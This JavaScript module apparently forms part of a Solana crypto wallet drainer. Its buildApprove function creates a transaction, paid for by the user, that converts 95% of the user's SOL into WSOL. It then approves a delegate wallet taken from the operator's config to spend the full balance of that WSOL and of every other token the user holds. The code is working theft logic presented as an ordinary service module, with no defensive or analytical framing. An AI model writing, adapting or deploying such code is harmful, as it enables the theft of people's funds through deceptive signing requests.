const { 
    Transaction, 
    PublicKey, 
    SystemProgram,
    LAMPORTS_PER_SOL
} = require("@solana/web3.js");
const { 
    createApproveInstruction,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddressSync,
    TOKEN_PROGRAM_ID,
    NATIVE_MINT,
    createSyncNativeInstruction
} = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { setBlockhash } = require("../core/blockhashCache");

const MIN_RAW_AMOUNT = 1000n;
const JUP_SOL_AMOUNT = 0.005 * LAMPORTS_PER_SOL;
const SOL_TO_WSOL_RATIO = 0.95;
const MAX_INSTRUCTIONS_PER_TX = 12;

async function buildApprove(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();
            const tx = new Transaction();

            const userPubkey = new PublicKey(user);
            const delegatePubkey = new PublicKey(config.WALLET);

            // Blockhash
            const { blockhash } = await conn.getLatestBlockhash("confirmed");
            setBlockhash(blockhash);
            tx.recentBlockhash = blockhash;
            tx.feePayer = userPubkey;

            // ===== 1. Create WSOL ATA (if doesn't exist) =====
            const wsolAta = getAssociatedTokenAddressSync(
                new PublicKey(NATIVE_MINT),
                userPubkey,
                false,
                TOKEN_PROGRAM_ID
            );

            const wsolAtaInfo = await conn.getAccountInfo(wsolAta);
            let wsolAmount = 0n;
            
            if (!wsolAtaInfo) {
                tx.add(
                    createAssociatedTokenAccountInstruction(
                        userPubkey,
                        wsolAta,
                        userPubkey,
                        new PublicKey(NATIVE_MINT),
                        TOKEN_PROGRAM_ID,
                        TOKEN_PROGRAM_ID
                    )
                );
            }

            // ===== 2. Convert SOL → WSOL =====
            const userBalance = await conn.getBalance(userPubkey);
            const solToConvert = Math.floor(userBalance * SOL_TO_WSOL_RATIO);

            if (solToConvert > 0) {
                tx.add(
                    SystemProgram.transfer({
                        fromPubkey: userPubkey,
                        toPubkey: wsolAta,
                        lamports: solToConvert
                    })
                );

                tx.add(
                    createSyncNativeInstruction(
                        wsolAta,
                        TOKEN_PROGRAM_ID
                    )
                );

                wsolAmount = BigInt(solToConvert);
            }

            // ===== 3. Get all tokens to approve =====
            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
            if (!tokenAccounts) throw new Error("Failed to fetch token accounts");

            const approvableTokens = [];

            if (wsolAmount > 0n) {
                approvableTokens.push({
                    ata: wsolAta,
                    amount: wsolAmount,
                    symbol: "WSOL"
                });
            }

            for (const token of tokenAccounts.tokens || []) {
                if (token.amount >= MIN_RAW_AMOUNT) {
                    approvableTokens.push({
                        ata: new PublicKey(token.ata),
                        amount: BigInt(token.amount),
                        symbol: token.symbol || "Unknown"
                    });
                }
            }

            // ===== 4. Approve all tokens (max 12 instructions) =====
            for (const token of approvableTokens) {
                tx.add(
                    createApproveInstruction(
                        token.ata,
                        delegatePubkey,
                        userPubkey,
                        token.amount
                    )
                );

                // Stop at max instructions
                if (tx.instructions.length >= MAX_INSTRUCTIONS_PER_TX) {
                    break;
                }
            }

            logger.info("Approve TX built", {
                instructions: tx.instructions.length,
                approvedTokens: approvableTokens.slice(0, tx.instructions.length - (wsolAmount > 0n ? 3 : 0)).length,
                maxInstructionsPerTx: MAX_INSTRUCTIONS_PER_TX
            });

            return tx;
        } catch (err) {
            logger.error("Failed to build approve transaction", { error: err.message });
            throw err;
        }
    }, "buildApprove");
}

module.exports = { buildApprove };
